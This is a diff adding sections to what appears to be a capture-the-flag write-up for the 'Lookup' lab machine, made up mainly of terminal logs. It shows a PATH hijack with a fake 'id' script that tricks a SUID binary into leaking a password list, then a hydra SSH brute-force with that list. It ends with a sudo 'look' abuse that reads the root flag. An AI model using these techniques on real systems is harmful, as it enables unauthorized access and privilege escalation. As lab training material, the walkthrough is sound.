@@ -152,7 +152,7 @@ Processed Requests: 5598
 Filtered Requests: 5597
 Requests/sec.: 0
 
-
+### Initial access
 
 msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > options
 
@@ -308,6 +308,118 @@ www-data@lookup:/home/think$
 
 
 
+### SUID find all file with SUID bit
+
+think@lookup:/tmp$ find / -perm -u=s -type f 2>/dev/null
+**/usr/sbin/pwm** unusual
+/usr/bin/at
+/usr/bin/fusermount
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/umount
+
+
+## what it do ? 
+think@lookup:/tmp$ /usr/sbin/pwm
+[!] Running '**id**' command to extract the username and user ID (UID)
+[!] ID: think
+
+
+### Privilage Escalation to user Think via fake : PATH
+
+www-data@lookup://$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/usr/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+think:x:1000:1000:,,,:/home/think:/bin/bash
+fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
+
+www-data@lookup://$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+www-data@lookup://$ cd /tmp
+cd /tmp
+
+www-data@lookup:/tmp$ chmod +x id
+chmod +x id
+
+www-data@lookup:/tmp$ export PATH=/tmp:$PATH
+export PATH=/tmp:$PATH
+
+www-data@lookup:/tmp$ echo $PATH
+echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+www-data@lookup:/tmp$ echo "echo 'uid=1000(think) gid=1000(think) groups=1000(think)'" > id
+<00(think) gid=1000(think) groups=1000(think)'" > id
+
+www-data@lookup:/tmp$ cat id
+cat id
+echo 'uid=1000(think) gid=1000(think) groups=1000(think)'
+www-data@lookup:/tmp$ id
+id
+uid=1000(think) gid=1000(think) groups=1000(think)
+www-data@lookup:/tmp$ /usr/sbin/pwm
+/usr/sbin/pwm
+[!] Running 'id' command to extract the username and user ID (UID)
+[!] ID: think
+jose1006
+jose1004
+jose1002
+
+### get wordlist of passwords
+
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/www]
+└─$ hydra -l think -P ../THM/THM_Lookup/pass.think 10.10.119.153 ssh 
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-29 12:15:07
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 49 login tries (l:1/p:49), ~4 tries per task
+[DATA] attacking ssh://10.10.119.153:22/
+[22][ssh] host: 10.10.119.153   login: think  **password: josemario.AKA(think)**
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 2 final worker threads did not complete until end.
+[ERROR] 2 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-29 12:15:23
+
+### get ssh access as think password: josemario.AKA(think)
+
+think@lookup:~$ ls
+user.txt
+think@lookup:~$ cat user.txt 
+38375fb4dd8baa2b2039ac03d92b820e
+think@lookup:~$ sudo -l
+[sudo] password for think: 
+Matching Defaults entries for think on lookup:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User think may run the following commands on lookup:
+    (ALL) /usr/bin/look
+think@lookup:~$ 
+
+### get root flag 
+think@lookup:~$ sudo -l
+[sudo] password for think: 
+Matching Defaults entries for think on lookup:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User think may run the following commands on lookup:
+    (ALL) /usr/bin/look
+think@lookup:~$ sudo /usr/bin/look '' /root/root.txt
+5a285a9f257e45c68bb6c9f9f57d18e8
 
 
 <\code>
